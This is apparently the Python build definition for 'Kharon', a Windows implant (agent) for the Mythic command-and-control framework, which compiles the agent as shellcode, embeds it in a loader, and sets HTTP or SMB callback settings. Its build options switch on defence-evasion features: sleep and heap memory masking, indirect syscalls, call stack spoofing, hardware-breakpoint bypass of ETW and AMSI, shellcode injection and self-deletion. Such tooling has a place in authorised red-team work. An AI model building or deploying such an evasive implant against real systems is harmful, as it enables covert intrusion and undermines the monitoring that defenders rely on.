import logging
import pathlib
import asyncio
import os
import tempfile
import traceback
from distutils.dir_util import copy_tree

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

class KharonAgent(PayloadType):
    name = "Kharon"
    file_extension = "bin"
    author = "@Oblivion"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    wrapped_payloads = []
    note = "Kharon agent. Version: v0.0.1"
    supports_dynamic_loading = False
    c2_profiles = ["http", "smb"]
    translation_container = "KharonTranslator"

    # Path configurations
    AgentPath = pathlib.Path(".") / "Kharon"
    AgentIconPath = AgentPath / "Kharon.jpg"
    AgentCodePath = pathlib.Path(".") / ".." / "Agent"
    LoaderCodePath = pathlib.Path(".") / ".." / "Loader"
    BrowserScriptPath = AgentPath / "BrowserScripts"

    agent_code_path = AgentPath
    agent_icon_path = AgentIconPath
    agent_browserscript_path = BrowserScriptPath

    build_parameters = [
        BuildParameter(
            name="Debug",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="0.1 [GLOBAL] Enable debug output (uses DbgPrint visible in debugger)"
        ),
        BuildParameter(
            name="Format",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["exe", "dll", "svc", "bin"],
            default_value="bin",
            description="0.2 [GLOBAL] Output format (executable, DLL, service, or shellcode)"
        ),
        BuildParameter(
            name="Architecture",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["x64", "x86"],
            default_value="x64",
            description="0.3 [GLOBAL] Target architecture"
        ),
        BuildParameter(
            name="Injection Shellcode",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["Classic", "Stomp"],
            default_value="Classic",
            description="1.6 [AGENT] Shellcode injection technique"
        ),
        BuildParameter(
            name="Mask",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["Timer", "None"],
            default_value="None",
            description="1.0 [AGENT] Memory obfuscation technique during sleep"
        ),
        BuildParameter(
            name="Heap Mask",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="1.1 [AGENT] Obfuscate heap during sleep"
        ),
        BuildParameter(
            name="Indirect Syscall",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="1.2 [AGENT] Use indirect syscalls"
        ),
        BuildParameter(
            name="Hardware Breakpoint",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["ETW", "AMSI", "All", "None"],
            default_value="None",
            description="1.3 [AGENT] Hardware breakpoint bypass technique"
        ),
        BuildParameter(
            name="Call Stack Spoofing",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="1.4 [AGENT] Spoof call stack for certain WinAPIs"
        ),
        BuildParameter(
            name="BOF Hook",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="1.5 [AGENT] Enable Beacon Object File hooks"
        ),
        BuildParameter(
            name="Killdate",
            parameter_type=BuildParameterType.Date,
            description="1.7 [AGENT] Date when agent will self-terminate"
        ),
        BuildParameter(
            name="Self Delete",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="1.8 [AGENT] Enable self-deletion in killdate routine"
        ),
        BuildParameter(
            name="Exit Method",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["Process", "Thread"],
            default_value="Process",
            description="1.9 [AGENT] Exit method for killdate routine"
        )
    ]

    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="Collecting required build files"),
        BuildStep(step_name="Configuring Profile", step_description="Applying C2 profile settings"),
        BuildStep(step_name="Setting Security", step_description="Configuring security features"),
        BuildStep(step_name="Compiling Agent", step_description="Building the agent shellcode"),
        BuildStep(step_name="Embedding Shellcode", step_description="Preparing loader with agent shellcode"),
        BuildStep(step_name="Compiling Loader", step_description="Building the loader executable")
    ]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)
        
        try:
            # Step 1: Initialize and gather files
            await self.update_build_step("Gathering Files", "Preparing build environment")
            agent_temp_dir = tempfile.TemporaryDirectory(suffix=self.uuid)
            copy_tree(str(self.AgentCodePath), agent_temp_dir.name)

            # Create loader temp directory early for EXE format
            if self.get_parameter("Format") == "exe":
                loader_temp_dir = tempfile.TemporaryDirectory(suffix=self.uuid + "_loader")
                copy_tree(str(self.LoaderCodePath), loader_temp_dir.name)

            # Step 2: Process C2 profile configuration
            c2_profile = self.c2info[0].get_c2profile()["name"]
            config = self.process_c2_configuration(c2_profile)
            await self.update_build_step("Configuring Profile", f"Applied {c2_profile.upper()} profile settings")

            # Step 3: Prepare security configurations
            build_config = self.prepare_build_configuration(config, c2_profile)
            await self.update_build_step("Setting Security", "Applied security configurations")

            # Step 4: Compile the agent
            compile_command = self.generate_compile_agent(agent_temp_dir.name, build_config)
            await self.update_build_step("Compiling Agent", f"Running: {compile_command}")
            
            proc = await asyncio.create_subprocess_shell(
                compile_command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()

            agent_output_file = self.get_agent_output_path(agent_temp_dir.name)

            logging.info(f"stdout: {stdout.decode('utf-8', errors='ignore')}")
            logging.info(f"stderr: {stderr.decode('utf-8', errors='ignore')}")

            if not os.path.exists(agent_output_file):
                resp.status = BuildStatus.Error
                resp.error_message = "Agent compilation failed - no output file produced"
                resp.build_stderr = stderr.decode('utf-8', errors='ignore')
                resp.build_stdout = stdout.decode('utf-8', errors='ignore')
                return resp

            # Handle non-EXE formats
            if self.get_parameter("Format") != "exe":
                resp.payload = open(agent_output_file, "rb").read()
                resp.updated_filename = f"Kharon.{build_config['arch']}.{self.get_parameter('Format')}"
                return resp

            # Step 5: Embed shellcode into loader (EXE format only)
            await self.update_build_step("Embedding Shellcode", "Converting agent to loader format")
            
            # Read the compiled shellcode
            with open(agent_output_file, "rb") as f:
                shellcode_bytes = f.read()
            
            # Generate C-style array
            hex_array = self.generate_hex_array(shellcode_bytes)
            
            # Update Agent.h in loader directory
            agent_h_path = os.path.join(loader_temp_dir.name, "Agent.h")
            with open(agent_h_path, "w") as f:
                f.write("#pragma once\n\n")
                f.write("__attribute__((section(\".text\")))\n")
                f.write("unsigned char Shellcode[] = {\n")
                f.write(hex_array)
                f.write("\n};\n\n")
                f.write(f"unsigned int ShellcodeSize = sizeof(Shellcode);\n")

            # Step 6: Compile the loader (EXE format only)
            compile_command = self.generate_compile_loader(loader_temp_dir.name, build_config)
            await self.update_build_step("Compiling Loader", f"Running: {compile_command}")
            
            proc = await asyncio.create_subprocess_shell(
                compile_command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()

            logging.info(f"stdout: {stdout.decode('utf-8', errors='ignore')}")
            logging.info(f"stderr: {stderr.decode('utf-8', errors='ignore')}")

            loader_output_file = os.path.join(loader_temp_dir.name, "Bin", f"Kharon.{build_config['arch']}.exe")
            
            if os.path.exists(loader_output_file):
                resp.payload = open(loader_output_file, "rb").read()
                resp.updated_filename = f"Kharon.{build_config['arch']}.exe"
            else:
                resp.status = BuildStatus.Error
                resp.error_message = "Loader compilation failed - no output file produced"
                resp.build_stderr = stderr.decode('utf-8', errors='ignore')
                resp.build_stdout = stdout.decode('utf-8', errors='ignore')

        except Exception as e:
            resp.status = BuildStatus.Error
            resp.error_message = str(e)
            logging.error(f"Build failed: {traceback.format_exc()}")

        return resp

    def generate_hex_array(self, shellcode_bytes: bytes) -> str:
        """Convert shellcode bytes to formatted C-style hex array"""
        hex_lines = []
        for i in range(0, len(shellcode_bytes), 12):
            chunk = shellcode_bytes[i:i+12]
            hex_lines.append("    " + ", ".join([f"0x{byte:02x}" for byte in chunk]))
        return ",\n".join(hex_lines)

    def process_c2_configuration(self, c2_profile: str) -> dict:
        """Process C2-specific configuration parameters"""
        config = {
            "c2_profile": c2_profile,
            "payload_uuid": self.uuid,
        }

        if c2_profile == "http":
            http_config = {
                "callback_host": "",
                "callback_jitter": 0,
                "callback_interval": 0,
                "User-Agent": "",
                "headers": "",
                "cookies": [],
                "httpMethod": "POST",
                "post_uri": "",
                "callback_port": 80,
                "ssl": False,
                "proxy_enabled": False,
                "proxy_url": "",
                "proxy_host": "",
                "proxy_port": "",
                "proxy_user": "",
                "proxy_pass": "",
            }

            for c2 in self.c2info:
                params = c2.get_parameters_dict()
                
                for key in http_config.keys():
                    if key in params and key != "headers":
                        http_config[key] = params[key]
                
                if "headers" in params:
                    headers = params["headers"]
                    
                    if "User-Agent" in headers:
                        http_config["User-Agent"] = headers["User-Agent"]
                    
                    headers_list = []
                    cookie_list  = []
                    for key, value in headers.items():
                        if key.lower() != "user-agent":  
                            headers_list.append(f"{key}: {value}")
                        elif key.lower() != "cookie":  
                            cookie_list.append(f"{key}: {value}")
                    
            if headers_list:
                http_config["headers"] = "\\r\\n".join([""] + headers_list + [""]) + "\\r\\n"
            else:
                http_config["headers"] = ""

            if http_config["proxy_host"] != "":
                http_config["proxy_host"]    = http_config["proxy_host"].replace("https://", "").replace("http://","");
                http_config["proxy_enabled"] = True
                http_config["proxy_url"]     = f"{http_config['proxy_host']}:{http_config['proxy_port']}"
            
            http_config["ssl"] = "https://" in self.c2info[0].get_parameters_dict().get("callback_host", "")
            http_config["callback_host"] = http_config["callback_host"].replace("https://", "").replace("http://", "")
            http_config["post_uri"] = "/" + http_config["post_uri"].lstrip("/")
            
            config.update(http_config)

        elif c2_profile == "smb":
            smb_config = {"pipename": ""}
            
            # Get SMB parameters from Mythic
            for c2 in self.c2info:
                smb_config.update(c2.get_parameters_dict())
                break

            config.update(smb_config)

        return config

    def prepare_build_configuration(self, config: dict, c2_profile: str) -> dict:
        """Prepare all build configurations and compiler definitions"""
        arch = self.get_parameter("Architecture")
        debug = "on" if self.get_parameter("Debug") else "off"
        syscall_flags = 0
        if self.get_parameter('Indirect Syscall'):
            syscall_flags += 0x100
        
        if self.get_parameter('Call Stack Spoofing'):
            syscall_flags += 0x250

        build_config = {
            "arch": arch,
            "debug": debug,
            "base_defs": [
                f"ARCH={arch}",
                f"DBGMODE={debug}",
                f"KH_SLEEP_TIME={config.get('callback_interval', 0)}",
                f"KH_SLEEP_JITTER={config.get('callback_jitter', 0)}",
                f"KH_AGENT_UUID={config['payload_uuid']}",
            ],
            "security_defs": [
                f"KH_SLEEP_MASK={self.get_mask_value()}",
                f"KH_HEAP_MASK={1 if self.get_parameter('Heap Mask') else 0}",
                f"SYSCALL_FLAGS={syscall_flags}",
                f"KH_CALL_STACK_SPOOF={1 if self.get_parameter('Call Stack Spoofing') else 0}",
                f"KH_BOF_HOOK_ENALED={1 if self.get_parameter('BOF Hook') else 0}",
                f"KH_INDIRECT_SYSCALL_ENABLED={1 if self.get_parameter('Indirect Syscall') else 0}",
                f"KH_HARDWARE_BREAKPOINT_BYPASS_DOTNET={self.get_hardware_breakpoint_value()}",
                f"KH_INJECTION_SC={self.get_injection_value()}",
            ],
            "c2_defs": []
        }

        # Add C2-specific definitions
        if c2_profile == "http":
            cookies_formatted = "{" + ", ".join(config["cookies"]) + "}"

            build_config["c2_defs"].extend([
                f"PROFILE_C2=0x25",  # Changed to 0x25 for HTTP
                f"WEB_PORT={config.get('callback_port', 80)}",
                f"WEB_HOST={config['callback_host']}",
                f"WEB_ENDPOINT={config['post_uri']}",
                f'WEB_USER_AGENT="{config["User-Agent"]}"',
                f'WEB_HTTP_HEADERS="{config["headers"]}"',
                f"WEB_HTTP_COOKIES={cookies_formatted}",
                f"WEB_HTTP_COOKIES_QTT={len(config['cookies'])}",
                f"WEB_SECURE_ENABLED={int(config['ssl'])}",
                f"WEB_PROXY_ENABLED={int(config['proxy_enabled'])}",
                f"WEB_PROXY_URL={config['proxy_url']}",
                f"WEB_PROXY_PASSWORD={config['proxy_pass']}",
                f"WEB_PROXY_USERNAME={config['proxy_user']}",
            ])
        elif c2_profile == "smb":
            build_config["c2_defs"].extend([
                f"PROFILE_C2=0x15",  # Changed to 0x15 for SMB
                f"SMB_PIPE_NAME={config['pipename']}",
            ])

        return build_config

    def generate_compile_agent(self, build_dir: str, config: dict) -> str:
        """Generate the compilation command for the agent"""
        all_defs = config["base_defs"] + config["security_defs"] + config["c2_defs"]
        make_args = " ".join(all_defs)
        build_type = f"{config['arch']}-{'debug' if config['debug'] == 'on' else 'release'}"
        return f"make -C {build_dir} {build_type} BUILD_PATH={build_dir} {make_args}"

    def generate_compile_loader(self, build_dir: str, config: dict) -> str:
        """Generate the compilation command for the loader"""
        build_type = f"{config['arch']}-{'debug' if config['debug'] == 'on' else 'release'}"
        return f"make -C {build_dir} {build_type} BUILD_PATH={build_dir}"

    def get_agent_output_path(self, build_dir: str) -> str:
        """Determine the correct output file path for the agent"""
        arch = self.get_parameter("Architecture")
        return os.path.join(build_dir, "Bin", f"Kharon.{arch}.bin")

    def get_mask_value(self) -> int:
        mask_choices = {"Timer": 1, "None": 3}
        return mask_choices.get(self.get_parameter("Mask"), 3)

    def get_hardware_breakpoint_value(self) -> str:
        hwbp_choices = {
            "ETW": "0x400",
            "AMSI": "0x700",
            "All": "0x100",
            "None": "0x000",
        }
        return hwbp_choices.get(self.get_parameter("Hardware Breakpoint"), "0x000")

    def get_injection_value(self) -> int:
        inj_choices = {"Classic": 0, "Stomp": 1}
        return inj_choices.get(self.get_parameter("Injection Shellcode"), 0)

    async def update_build_step(self, step_name: str, message: str, success: bool = True):
        """Helper method to update build step status"""
        await SendMythicRPCPayloadUpdatebuildStep(
            MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName=step_name,
                StepStdout=message,
                StepSuccess=success
            )
        )